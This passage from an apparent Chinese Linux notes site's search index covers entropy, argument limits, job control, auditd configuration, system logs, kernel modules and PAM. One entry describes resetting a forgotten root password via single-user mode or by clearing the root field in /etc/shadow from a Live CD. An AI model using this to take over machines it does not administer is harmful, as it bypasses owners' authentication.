在信息学中，熵被用来表征一个符号或系统的不确定性，熵越大，表明系统所含有用信息量越少，不确定度越大。 计算机本身是可预测的系统，因此，用 计算机算法 不可能产生真正的随机数。但是机器的环境中充满了各种各样的噪声， 如硬件设备发生中断的时间，用户点击鼠标的时间间隔等是完全随机的， 事先无法预测。 Linux内核实现的随机数产生器正是利用系统中的这些随机噪声来产生高质量随机数序列。 内核维护了一个熵池用来收集来自 设备驱动程序 和其它来源的环境噪音。 理论上，熵池中的数据是完全随机的，可以实现产生真随机数序列。 为跟踪熵池中数据的随机性，内核在将数据加入池的时候将估算数据的随机性， 这个过程称作熵估算。熵估算值描述池中包含的随机数位数，其值越大表示池中数据的随机性越好。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-entropy.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-entropy.html"},{"title":"随机数","text":"/dev/random和/dev/urandom其实效果都是一样的 man描述的不是很准确 详细见: https://zhuanlan.zhihu.com/p/64680713 真伪随机是存在的: https://blog.csdn.net/czc1997/article/details/78167705 但是linux的/dev/random和/dev/urandom与真伪并不完全一致","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-random-number.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-random-number.html"},{"title":"二进制数据访问","text":"最基础的查看二进制数据的方法是使用 od -t x1 命令。 参考 /docs/操作系统/linux/linux指令/od","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Dual--proof-data-access.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Dual--proof-data-access.html"},{"title":"获取所有变量与环境变量","text":"环境变量 env或export 所有变量 set 注解 变量不能以数字开头 若 A=B 且 B=C，若我下达 unset $A，则取消的是什么？ 取消的是B，因为 unset $A 相当于 unsetB 所以取消的是B，A会继续存在","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Get-all-variables-and-environment-variables.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Get-all-variables-and-environment-variables.html"},{"title":"linux参数过长","text":"关于linux参数过长问题， 查看参数可以使用: xargs --show-limits 其中会有一个这个: Size of command buffer we are actually using: 131072 表示命令行单个参数长度不能超过 131072 实际测试 最大只能到 131071: /bin/echo `python -c \"print '.'*131071\"` 一些文章参考:: python – 为什么subprocess.Popen参数长度限制... Linux command line character limit 【Linux】【编译相关】execvp: /bin/sh: Argument list too long问题处理小结 What defines the maximum size for a command single argument? Unix / Linux: Maximum Character Length of Arguments In a Shell Command","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-LINUX-parameter-is-too-long.html","loc":"/yq-doc-source-docs-operating-system-linux-question-LINUX-parameter-is-too-long.html"},{"title":"进程暂停与挂起","text":"在macos上验证 ctrl + z 暂停进程 恢复 jobs 查看有哪些进程被暂停 bg %N 使第N个任务在后台运行（%前有空格） fg %N 使第N个任务在前台运行 jg %n 挂起被暂停的进程，n为进程序号 注解 默认bg，fg不带%N时表示对最后一个进程操作！ 相关指令: /docs/操作系统/linux/linux指令/jobs /docs/操作系统/linux/linux指令/bg 转后台执行 /docs/操作系统/linux/linux指令/fg 恢复执行","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Process-pause-and-hanging.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Process-pause-and-hanging.html"},{"title":"root密码忘记","text":"查看 /etc/shadow 使用的加密机制: authconfig --test | grep hashing 方法一 重启进入单人维护模式，系统会主动给予 root 权限的 bash 接口， 然后 passwd 修改 方法二 以 Live CD 开机后挂载根目录去修改 /etc/shadow，将里面的 root 密码字段清空 方法三 如果普通用户有sudo的passwd权限，那么直接 sudo passwd即可","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Root-password-forgotten.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Root-password-forgotten.html"},{"title":"单次任务","text":"即一次性任务 运行 at 命令来安排一次性的工作: $ echo 'command -args'| at 3:40 monday","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Single-task.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Single-task.html"},{"title":"Linux的一些内核参数","text":"问题背景: execvp: /bin/sh: Argument list too long 问题出现的两种情况： make的时候，如编译Linux内核、驱动、Android版本等较长-I、-D选项的情况； shell操作，涉及较多文件的情况，如删除大量文件时，直接用rm； 问题原因 错误来源于sysdeps/gnu/errlist.c文件中: [ERR_REMAP (E2BIG)] = N_(\"Argument list too long\"), 可据此找到对应Linux内核中exec.c中返回E2BIG的地方，实际和ARG_MAX有很大关系。 参考APUE，ARG_MAX的值在运行时间不变的值，但值可能不确定。 ARG_MAX的值实际上和下面参数有关系 MAX_ARG_STRLEN #单个字符串的最大大小 MAX_ARG_STRINGS #参数个数的限制 MAX_ARG_PAGES #分配给参数的最大页数 stack size #堆栈空间 ARG_MAX in limits.h #参数的最大长度 实际上，不同内核的版本也有区别。 几个命令执行情况的例子: [qxhgd@localhost]getconf ARG_MAX 2897152 [qxhgd@localhost]ulimit -s 8192 [qxhgd@localhost]xargs --show-limits Your environment variables take up 4222 bytes POSIX upper limit on argument length (this system): 2090882 POSIX smallest allowable upper limit on argument length (all systems): 4096 Maximum length of command we could actually use: 2086660 Size of command buffer we are actually using: 131072 参考: https://blog.csdn.net/qxhgd/article/details/115472297","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Some-kernel-parameters-of-Linux.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Some-kernel-parameters-of-Linux.html"},{"title":"谁在系统","text":"你可以通过下面的方法检查谁登录在系统里。 who 显示谁登录在系统里面。 w 显示谁登录在系统里面，他们正在在做什么。 last 显示用户最后登录的列表。 lastb 显示用户最后错误登录的列表。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-question-Who-is-in-the-system.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Who-is-in-the-system.html"},{"title":"ACL权限控制","text":"查看acl权限: getfacle $filename 参考: /docs/操作系统/linux/linux指令/getfacle 设置acl权限: setfacle 选项 文件名 参考: /docs/操作系统/linux/linux指令/setfacle 参考地址: http://c.biancheng.net/view/863.html","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-ACL-permission-control.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-ACL-permission-control.html"},{"title":"auditd-系统审计","text":"auditd The Linux Audit Subsystem is a system to Collect information regarding events occurring on the system(s) , Kernel events (syscall events), User events (audit-enabled programs) syslog记录的信息有限，主要目的是软件调试，跟踪和打印软件的运行状态，而audit的目的则不同， 它是linux安全体系的重要组成部分，是一种\"被动\"的防御体系。 在内核里有内核审计模块，记录系统中的各种动作和事件，比如系统调用，文件修改，执行的程序， 系统登入登出和记录所有系统中所有的事件，它的主要目的是方便管理员根据日记审计系统是否允许有异常， 是否有入侵等等，说穿了就是把和系统安全有关的事件记录下来。 auditd 是Linux审计系统的用户空间组件，它负责将审计记录写入磁盘。 查看日志使用 ausearch 或 aureport 实用程序完成。 使用 auditctl 实用程序配置审核系统或加载规则。 在 auditd 启动期间， /etc/audit/audit.rules 中的审计规则由 auditctl 读取并加载到内核中。 或者还有一个 augenrules 程序，读取 /etc/audit/rules.d/ 中的规则并将其编译成 audit.rules 审计规则文件中。 审计守护进程本身 有一些配置选项可以让管理员进行自定义配置 audit可以用来干什么 Watching file access Monitoring system calls Recording commands run by a user Recording security events Monitoring network access 怎么开启audit 首先内核需要打开 CONFIG_AUDIT 的配置，在打开了配置重新编译内核后， audit功能默认是关闭的，有两种方法在使能audit: cmdline中加入audit= 1参数，如果这个参数设置为1，而且auditd没有运行，则审计日志会被写到/var/log/messages中。 使用守护进程auditd 详见 https://blog.csdn.net/whuzm08/article/details/87267956 auditd相关工具与配置文件 auditctl 即时控制审计守护进程的行为的工具，比如如添加规则等等 aureport 查看和生成审计报告的工具 ausearch 查找审计事件的工具 auditspd 转发事件通知给其他应用程序，而不是写入到审计日志文件中 autrace 一个用于跟踪进程的命令 /etc/audit/auditd.conf auditd工具的配置文件 /etc/audit/rules.d/audit.rules 包含审核规则的文件 /etc/audit/audit.rules 记录审计规则的文件 配置字段的含义 type=SYSCALL 每条记录都是以type=\"keyword\"开头， SYSCALL表示这条记录是向内核的系统调用触发产生的。 更详细的type值和解释可以参考: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/sec-Audit_Record_Types msg=audit(1523501777.709:4172989316) 在audit(time_stamp:ID)格式中，记录时间戳，从1970年1月1日00:00:00到现在的时间， ID为记录中唯一的ID标识，同一个事件产生的ID是相同的， 如上访问audit_test目录会触发产生三条日志，但是事件ID是相同的。 arch=c000003e 表示系统的CPU架构，这个十六进制表示\"x86_64\"， 使用命令 ausearch -i --arch c000003e 可以打印出有这部分内容的audit.log中日志的解释。 需要注意的是，使用ausearch来查询时，需要保证audit log中有这样的日志记录。 syscall=257 向内核的系统调用的类型，类型值为257，在/usr/include/asm/unistd_64.h中有定义， 这里257表示openat，可以使用命令ausyscall来查询不同的数字对应的系统调用名称。 或者使用 ausyscall --dump 命令来显示所有的系统调用: # ausyscall 257 openat # ausyscall --dump Using x86_64 syscall table: 0 read 1 write 2 open success=yes 表示系统调用成功与否 exit=3 系统调用结束时的返回码，可以使用如下命令来查看返回值为3的日志解释，不同的系统调用，返回值不同: #ausearch --interpret --exit 3 a0=ffffffffffffff9c a1=21e0550 a2=90800 a3=0 为系统调用时的前四个arguments，这些arguments依赖于使用的系统调用，可以使用ausearch来查看解释（部分参数可以打印出数值具体的解释）。 items=1 表示跟在系统调用后，补充记录的个数。 ppid=2354 父进程ID，如bash的ID。 pid=30729 进程Id，即为ls进程的ID。我们通过ps来查询，可以看到bash的进程与ppid是对应的: linux-xdYUnA:/home/audit_test # ps -aux | grep bash lbh 2354 0.0 0.0 115376 2100 pts/1 S+ Apr11 0:00 bash root 12478 0.0 0.0 115888 2608 pts/0 Ss Apr11 0:00 -bash root 13329 0.1 0.0 115888 2612 pts/2 Ss 11:15 0:00 -bash root 15531 0.0 0.0 112652 972 pts/2 S+ 11:15 0:00 grep --color=auto bash root 30707 0.0 0.0 115888 2632 pts/1 Ss Apr11 0:00 -bash 关于/etc/audit/auditd.conf的配置 log_file =/var/log/audit/audit.log 审计日志文件的完整路径。 如果您配置守护进程向除默认/var/log/audit/外的目录中写日志文件时， 一定要修改它上面的文件权限, 使得只有根用户有读、写和执行权限 所有其他用户都不能访问这个目录或这个目录中的日志文件。 | log_format = RAW 写日志时要使用的格式。 当设置为RAW时，数据会以从内核中检索到的格式写到日志文件中。 当设置为NOLOG时，数据不会写到日志文件中， 但是如果用dispatcher选项指定了一个，则数据仍然会发送到审计事件调度程序中 | log_group = root 日志所属组 | priority_boost = 4 审计应采用多少优先级推进守护进程。必须是非负数。0表示没有变化 | flush = INCREMENTAL 多长时间向日志文件中写一次数据。值可以是NONE、INCREMENTAL、DATA和SYNC之一。 如果设置为NONE，则不需要做特殊努力来将数据 刷新到日志文件中。 如果设置为INCREMENTAL，则用freq选项的值确定多长时间发生一次向磁盘的刷新。 如果设置为DATA，则审计数据和日志文件一直是同步的。 如果设置为SYNC，则每次写到日志文件时，数据和元数据是同步的。 | freq = 20 如果flush设置为INCREMETNAL，审计守护进程在写到日志文件中前从内核中接收的记录数 | num_logs = 5 max_log_file_action设置为ROTATE时要保存的日志文件数目。必须是0~99之间的数。 如果设置为小于2，则不会循环日志。 如果递增了日志文件的数目，就可能有必要递增/etc/audit/audit.rules中的内核backlog设置值， 以便留出日志循环的时间。 如果没有设 置num_logs值，它就默认为0，意味着从来不循环日志文件。 当达到指定文件容量后会循环日志文件，但是只会保存一定数目的老文件，这个数目由num_logs参数指定。 老文件的文件名将为audit.log.N，其中 N是一个数字。这个数字越大，则文件越老。 | disp_qos = lossy 控制调度程序与审计守护进程之间的通信类型。有效值为lossy和lossless。 如果设置为lossy，若审计守护进程与调度程序之间的缓冲区已满 (缓冲区为128千字节)， 则发送给调度程序的引入事件会被丢弃。然而，只要log_format没有设置为nolog，事件就仍然会写到磁盘中。 如果设 置为lossless，则在向调度程序发送事件之前和将日志写到磁盘之前，调度程序会等待缓冲区有足够的空间。 | dispatcher = /sbin/audispd 当启动这个守护进程时，由审计守护进程自动启动程序。所有守护进程都传递给这个程序。 可以用它来进一步定制报表或者以与您的自定义分析程序兼容的不同格式 产生它们。 自定义程序的示例代码可以在/usr/share/doc/audit- /skeleton.c中找到。 由于调度程序用根用户特权运行，因此使用这个选项时要极其小心。这个选项不是必需的。 | name_format = NONE 格式: ##name = mydomain 此选项控制计算机节点名如何插入到审计事件流中。 它有如下的选择：none, hostname, fqd, numeric, and user None意味着没有计算机名被插入到审计事件中。 hostname通过gethostname系统调用返回的名称。 fqd意味着它=以主机名和解决它与DNS的完全合格的域名， numeric类似于fqd除解决本机的IP地址，为了使用这个选项， 你可能想要测试'hostname -i'或 'domainname-i'返回一个数字地址, 另外，此选项不如果DHCP的使用是因为你可以有不同的地址，在同一台机器上的时间推荐。 用户是从名称选项中定义的字符串。默认值是没有 | max_log_file = 6 以兆字节表示的最大日志文件容量。当达到这个容量时，会执行max_log_file _action指定的动作 | max_log_file_action = ROTATE 当达到max_log_file的日志文件大小时采取的动作。 值必须是IGNORE、SYSLOG、SUSPEND、ROTATE和KEEP_LOGS之 一。 如果设置为IGNORE，则在日志文件达到max_log_file后不采取动作。 如果设置为SYSLOG，则当达到文件容量时会向系统日志/var /log/messages中写入一条警告。 如果设置为SUSPEND，则当达到文件容量后不会向日志文件写入审计消息。 如果设置为ROTATE，则当达 到指定文件容量后会循环日志文件，但是只会保存一定数目的老文件， 这个数目由num_logs参数指定。老文件的文件名将为audit.log.N，其中 N是一个数字。这个数字越大，则文件越老。 如果设置为KEEP_LOGS，则会循环日志文件，但是会忽略num_logs参数，因此不会删除日志文件 space_left = 75 以兆字节表示的磁盘空间数量。 当达到这个水平时，会采取space_left_action参数中的动作 | space_left_action = SYSLOG 当磁盘空间量达到space_left中的值时，采取这个动作。 有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和 HALT。 如果设置为IGNORE，则不采取动作。 如果设置为SYSLOG，则向系统日志/var/log/messages写一条警告消息。 如果设置为EMAIL，则从action_mail_acct向这个地址发送一封电子邮件，并向/var/log/messages中写一条警告消息。 如果设置为 SUSPEND，则不再向审计日志文件中写警告消息。 如果设置为SINGLE，则系统将在单用户模式下。 如果设置为SALT，则系统会关闭 | action_mail_acct = root 负责维护审计守护进程和日志的管理员的电子邮件地址。 如果地址没有主机名，则假定主机名为本地地址，比如root。 必须安装sendmail并配置为向指定电子邮件地址发送电子邮件 | admin_space_left = 50 以兆字节表示的磁盘空间数量。 用这个选项设置比space_left_action更多的主动性动作， 以防万一space_left_action没有让管理员释放任何磁盘空间。 这个值应小于space_left_action。 如果达到这个水平，则会采取 admin_space_left_action 所指定的动作 | admin_space_left_action = SUSPEND 当自由磁盘空间量达到admin_space_left指定的值时，则采取动作。 有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和HALT。 与这些值关联的动作与 space_left_action 中的相同。 | disk_full_action = SUSPEND 如果含有这个审计文件的分区已满，则采取这个动作。 可能值为IGNORE、SYSLOG、SUSPEND、SINGLE和HALT。与这些值关联的动作与 space_left_action 中的相同。 | disk_error_action = SUSPEND 如果在写审计日志或循环日志文件时检测到错误时采取的动作。 值必须是IGNORE、SYSLOG、SUSPEND、SINGLE和HALT之一。 与这些值关的动作与space_left_action中的相同 | tcp_listen_port = 这是在范围1、65535，一个数字值，如果指定，原因auditd听在从远程系统审计记录相应的TCP端口。 审计程序可能与tcp_wrappers。 你可能想控制在hosts.allow入口访问和否认文件。 | tcp_listen_queue = 5 这是一个数字值，这表明有多少等待（要求但UNAC接受）的连接是允许的。 默认值是5。设置过小的可能导致连接被拒绝，如果太多主机开始在完全相同的时间，如电源故障后。 | tcp_max_per_addr = 1 格式: tcp_client_ports = 1024-65535 tcp_client_max_idle = 0 这是一个数字值，该值表示一个地址允许有多少个并发连接。 默认为1，最大为1024。 设置过大可能会允许拒绝服务攻击的日志服务器。 还要注意的是，内核内部有一个最大的，最终将防止这种即使auditd允许它通过配置。 在大多数情况下，默认应该是足够除非写一个自定义的恢复脚本运行提出未发送事件。 在这种情况下，您将增加的数量只有足够大，让它在过。 | enable_krb5 = no 如果设置为\"yes\"，Kerberos 5将用于认证和加密。默认是\"no\"。 | krb5_principal = auditd 这是这个服务器的主要。 默认是\"auditd\"。鉴于这种默认情况下，服务器会寻找一个名为`auditd/ hostname@EXAMPLE .COM`存储在/etc/audit/audit.key. 认证本身其中主机是服务器的主机名称，如DNS查找其IP地址返回。 | krb5_key_file = /etc/audit/audit.key 这个客户的主要负责人的位置。请注意，密钥文件必须由根和模式0400所拥有。默认的是/etc/audit/audit.key | 注解 auditd当max_action设置为rotate时，日志分隔具有延时性，且后缀数字最大的是最旧的log文件 研究audit日志规则，本文为进程配置: # 审计日志文件的完整路径。如果您配置守护进程向除默认/var/log/audit/外的目录中写日志文件时， # 一定要修改它上面的文件权限，使得只有根用户有读、写和执行权限。所有其他用户都不能访问这个 # 目录或这个目录中的日志文件。 log_file =/var/log/audit/audit.log # 写日志时要使用的格式。当设置为RAW时，数据会以从内核中检索到的格式写到日志文件中。当设置 # 为NOLOG时，数据不会写到日志文件中，但是如果用dispatcher选项指定了一个，则数据仍然会发送 # 到审计事件调度程序中 log_format = RAW # 日志所属组 log_group = root # 审计应采用多少优先级推进守护进程。必须是非负数。0表示没有变化。 priority_boost = 4 # 多长时间向日志文件中写一次数据。值可以是NONE、INCREMENTAL、DATA和SYNC之一。如果设置为 # NONE，则不需要做特殊努力来将数据 刷新到日志文件中。如果设置为INCREMENTAL，则用freq选项 # 的值确定多长时间发生一次向磁盘的刷新。如果设置为DATA，则审计数据和日志文件一直是同步的。 # 如果设置为SYNC，则每次写到日志文件时，数据和元数据是同步的。 flush = INCREMENTAL # 如果flush设置为INCREMETNAL，审计守护进程在写到日志文件中前从内核中接收的记录数 freq = 20 #max_log_file_action设置为ROTATE时要保存的日志文件数目。必须是0~99之间的数。如果设置为小于2， # 则不会循环日志。如果递 增了日志文件的数目，就可能有必要递增/etc/audit/audit.rules中的内核 # backlog设置值，以便留出日志循环的时间。如果没有设 置num_logs值，它就默认为0，意味着从来不循环日志文件。 num_logs = 5 # 控制调度程序与审计守护进程之间的通信类型。有效值为lossy和lossless。如果设置为lossy， # 若审计守护进程与调度程序之间的缓冲区已满 (缓冲区为128千字节)，则发送给调度程序的引入 # 事件会被丢弃。然而，只要log_format没有设置为nolog，事件就仍然会写到磁盘中。如果设 置为lossless， # 则在向调度程序发送事件之前和将日志写到磁盘之前，调度程序会等待缓冲区有足够的空间。 disp_qos = lossy # 当启动这个守护进程时，由审计守护进程自动启动程序。所有守护进程都传递给这个程序。可以用 # 它来进一步定制报表或者以与您的自定义分析程序兼容的不同格式 产生它们。自定义程序的示例 # 代码可以在/usr/share/doc/audit- /skeleton.c中找到。由于调度程序用根用户特权运行，因此使用 # 这个选项时要极其小心。这个选项不是必需的。 dispatcher = /sbin/audispd # 此选项控制计算机节点名如何插入到审计事件流中。它有如下的选择：none, hostname, fqd, numeric, and user # None意味着没有计算机名被插入到审计事件中。hostname通过gethostname系统调用返回的名称。fqd意味着它=以主机名 # 和解决它与DNS的完全合格的域名，numeric类似于fqd除解决本机的IP地址，为了使用这个选项，你可能想要测试'hostname -i' # 或 'domainname-i'返回一个数字地址,另外，此选项不如果DHCP的使用是因为你可以有不同的地址，在同一台机器上的时间推荐。 # 用户是从名称选项中定义的字符串。默认值是没有 name_format = NONE ##name = mydomain # 以兆字节表示的最大日志文件容量。当达到这个容量时，会执行max_log_file _action指定的动作 max_log_file = 6 # 当达到max_log_file的日志文件大小时采取的动作。值必须是IGNORE、SYSLOG、SUSPEND、ROTATE和KEEP_LOGS之 一。 # 如果设置为IGNORE，则在日志文件达到max_log_file后不采取动作。如果设置为SYSLOG，则当达到文件容量时会向 # 系统日志/var /log/messages中写入一条警告。如果设置为SUSPEND，则当达到文件容量后不会向日志文件写入审计 # 消息。如果设置为ROTATE，则当达 到指定文件容量后会循环日志文件，但是只会保存一定数目的老文件，这个数目 # 由num_logs参数指定。老文件的文件名将为audit.log.N，其中 N是一个数字。这个数字越大，则文件越老。如果设 # 置为KEEP_LOGS，则会循环日志文件，但是会忽略num_logs参数，因此不会删除日志文件 max_log_file_action = ROTATE # 以兆字节表示的磁盘空间数量。当达到这个水平时，会采取space_left_action参数中的动作 space_left = 75 # 当磁盘空间量达到space_left中的值时，采取这个动作。有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和 HALT。 # 如果设置为IGNORE，则不采取动作。如果设置为SYSLOG，则向系统日志/var/log/messages写一条警告消息。如果设置为 # EMAIL，则从action_mail_acct向这个地址发送一封电子邮件，并向/var/log/messages中写一条警告消息。如果设置为 # SUSPEND，则不再向审计日志文件中写警告消息。如果设置为SINGLE，则系统将在单用户模式下。如果设置为SALT，则系统会关闭。 space_left_action = SYSLOG # 负责维护审计守护进程和日志的管理员的电子邮件地址。如果地址没有主机名，则假定主机名为本地地址，比如root。 # 必须安装sendmail并配置为向指定电子邮件地址发送电子邮件。 action_mail_acct = root # 以兆字节表示的磁盘空间数量。用这个选项设置比space_left_action更多的主动性动作，以防万一space_left_action没有让 # 管理员释放任何磁盘空间。这个值应小于space_left_action。如果达到这个水平，则会采取admin_space_left_ action所指定的动作。 admin_space_left = 50 # 当自由磁盘空间量达到admin_space_left指定的值时，则采取动作。有效值为IGNORE、SYSLOG、EMAIL、SUSPEND、SINGLE和HALT。 # 与这些值关联的动作与space_left_action中的相同。 admin_space_left_action = SUSPEND # 如果含有这个审计文件的分区已满，则采取这个动作。可能值为IGNORE、SYSLOG、SUSPEND、SINGLE和HALT。与这些值关联的动作 # 与space_left_action中的相同。 disk_full_action = SUSPEND # 如果在写审计日志或循环日志文件时检测到错误时采取的动作。值必须是IGNORE、SYSLOG、SUSPEND、SINGLE和HALT之一。 # 与这些值关的动作与space_left_action中的相同 disk_error_action = SUSPEND # 这是在范围1、65535，一个数字值，如果指定，原因auditd听在从远程系统审计记录相应的TCP端口。审计程序可能与tcp_wrappers。 # 你可能想控制在hosts.allow入口访问和否认文件。 tcp_listen_port = # 这是一个数字值，这表明有多少等待（要求但UNAC接受）的连接是允许的。默认值是5。设置过小的可能导致连接被拒绝， # 如果太多主机开始在完全相同的时间，如电源故障后。 tcp_listen_queue = 5 # 这是一个数字值，该值表示一个地址允许有多少个并发连接。默认为1，最大为1024。设置过大可能会允许拒绝服务攻击的日志服务器。 # 还要注意的是，内核内部有一个最大的，最终将防止这种即使auditd允许它通过配置。在大多数情况下，默认应该是足够除非写一个 # 自定义的恢复脚本运行提出未发送事件。在这种情况下，您将增加的数量只有足够大，让它在过。 tcp_max_per_addr = 1 ##tcp_client_ports = 1024-65535 tcp_client_max_idle = 0 # 如果设置为\"yes\"，Kerberos 5将用于认证和加密。默认是\"no\"。 enable_krb5 = no # 这是这个服务器的主要。默认是\"auditd\"。鉴于这种默认情况下，服务器会寻找一个名为auditd/hostname@EXAMPLE.COM存储在/etc/audit/audit.key # 认证本身其中主机是服务器的主机名称，如DNS查找其IP地址返回。 krb5_principal = auditd # 这个客户的主要负责人的位置。请注意，密钥文件必须由根和模式0400所拥有。默认的是/etc/audit/audit.key krb5_key_file = /etc/audit/audit.key auditd的使用 安装auditd服务: # CentOS7系统默认安装了audit服务 rpm -aq | grep audit rpm -ql audit 配置audit.rules规则 默认情况下审计规则是空的 查看规则: auditctl -l 查看命令帮助: auditctl -h 例如添加一条规则: auditctl -w /data -p rwxa /*监控/data目录 -w path : 指定要监控的路径 -p : 指定触发审计的文件/目录的访问权限 rwxa ： 指定的触发条件，r 读取权限，w 写入权限，x 执行权限，a 属性（attr）*/ 永久保存审计规则 指令: vi /etc/audit/rules.d/audit.rules 例如将-w /data/ -p rwxa加入到最后一行 service auditd restart auditctl -l 审计效果 在/data/目录下生成一个文件或者修改文件，查看审计日志: tail -f /var/log/audit/audit.log 将audit日志通过rsyslog转发给日志服务器 audit有rsyslog插件能实现转发到本地的rsyslog服务: cd /etc/audisp/plugins.d/ vi syslog.conf 修改如下两项 active = yes args = LOG_LOCAL0 然后重启audit服务 service auditd restart audit审计日志还会输出到/var/log/message文件中 如果需要禁止输出到/var/log/messages文件，可以修改rsyslog.conf配置项并重启rsyslog服务 在如下位置加入local0.none来实现不输出到/var/log/messages中: vi /etc/rsyslog.conf *.info;mail.none;authpriv.none;cron.none;local0.none /var/log/messages 最后一行添加日志服务器 *.* @192.168.31.51 保存退出 service rsyslog restart 审计日志只输出到日志服务器，未打印到/var/log/messages中 系统日志 以下介绍的是20个位于/var/log/ 目录之下的日志文件。 其中一些只有特定版本采用，如dpkg.log只能在基于Debian的系统中看到。 /var/log/messages 包括整体系统信息，其中也包含系统启动期间的日志。 此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。 var/log/dmesg 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。 /var/log/auth.log 包含系统授权信息，包括用户登录和使用的权限机制等。 /var/log/boot.log 包含系统启动时的日志。 /var/log/daemon.log 包含各种系统后台守护进程日志信息。 /var/log/dpkg.log 包括安装或dpkg命令清除软件包的日志。 /var/log/kern.log 包含内核产生的日志，有助于在定制内核时解决问题。 /var/log/lastlog 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。 /var/log/maillog /var/log/mail.log 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。 /var/log/user.log 记录所有等级用户信息的日志。 /var/log/Xorg.x.log 来自X的日志信息。 /var/log/alternatives.log 更新替代信息都记录在这个文件中。 /var/log/btmp 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，\"last -f /var/log/btmp | more\"。 /var/log/cups 涉及所有打印信息的日志。 /var/log/anaconda.log 在安装Linux时，所有安装信息都储存在这个文件中。 /var/log/yum.log 包含使用yum安装的软件包信息。 /var/log/cron 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。 /var/log/secure 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。 /var/log/wtmp或/var/log/utmp 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。 /var/log/faillog 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。 除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录： /var/log/httpd/或/var/log/apache2 包含服务器access_log和error_log信息。 /var/log/lighttpd/ 包含light HTTPD的access_log和error_log。 /var/log/mail/ 这个子目录包含邮件服务器的额外日志。 /var/log/prelink/ 包含.so文件被prelink修改的信息。 /var/log/audit/ 包含被 Linux audit daemon储存的信息。 /var/log/samba/ 包含由samba存储的信息。 /var/log/sa/ 包含每日由sysstat软件包收集的sar文件。 /var/log/sssd/ 用于守护进程安全服务。 除了手动存档和清除这些日志文件以外，还可以使用logrotate在文件达到一定大小后自动删除。 可以尝试用vi，tail，grep和less等命令查看这些日志文件。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-Auditd.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Auditd.html"},{"title":"国际化和本地化","text":"程序支持国际化的行为，是通过配置环境变量 $LANG 来支持本地化。 语言环境的实际支持，依赖 libc 库提供的特性， 并要求安装 locales 或 locales-all 软件包。 locales 软件包需要被适当的初始化。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-Internationalization-and-localization.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Internationalization-and-localization.html"},{"title":"内核模块","text":"insmod 与 modprobe 都是载入 kernel module， 不过一般差别于 modprobe 能够处理 module 载入的相依问题。 比方你要载入 a module，但是 a module 要求系统先载入 b module 时， 直接用 insmod 挂入通常都会出现错误讯息， 不过 modprobe 倒是能够知道先载入 b module 后才载入 a module，如此相依性就会满足。 不过 modprobe 并不是大神，不会厉害到知道 module 之间的相依性为何， 该程式是读取 /lib/modules/2.6.xx/modules.dep 档案得知相依性的。 而该档案是透过 depmod 程式所建立。 相关指令 /docs/操作系统/linux/linux指令/lsmod /docs/操作系统/linux/linux指令/rmmod /docs/操作系统/linux/linux指令/insmod /docs/操作系统/linux/linux指令/modprobe","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-system-service-Kernel-module.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Kernel-module.html"},{"title":"PAM模块","text":"PAM（Pluggable Authentication Modules， 嵌入式模块） 一套应用程序编程接口，提供一连串的验证机制，使用者将需求告知，PAM返回使用者验证的结果 配置文件都在 /etc/pam.d 下面 如, passwd执行流程 用户执行 passwd，输入密码、 passwd 呼叫 PAM验证模块 PAM 模块会找到 /etc/pam.d/ 找寻与程序（passwd） 同名的配置文件 依据 /etc/pam.d/passwd 内的设定，引用相关的PAM模块进行验证分析 将验证结果回传给passwd passwd根据返回结果决定下一个动作（验证失败或者通过） 配置文件结构: # /etc/pam.d/passwd #%PAM-1.0 auth include system-auth 每一行可以区分为三个字段 type 主要分四种 auth authentication的缩写，检验使用者的身份验证，通常是需要密码检验的，所以后续接的模块是用来检验用户的身份。 account 大部分是在进行授权（authorization），检验使用者是否具有正确的权限，比如，使用一个过期的密码无法登陆 session 管理登陆期间（会话）环境 password 密码修改，变更 flag 验证通过的标准 required 此验证若成功则带有success标记， 若失败带有failure标记 不论是否成功都会进行后续流程（有利于log） requisite 如果是failure立刻返回给源程序失败，不会进行后续流程 sufficient 与上一个相反, 成功则立刻返回, 失败则继续后续步骤 optional 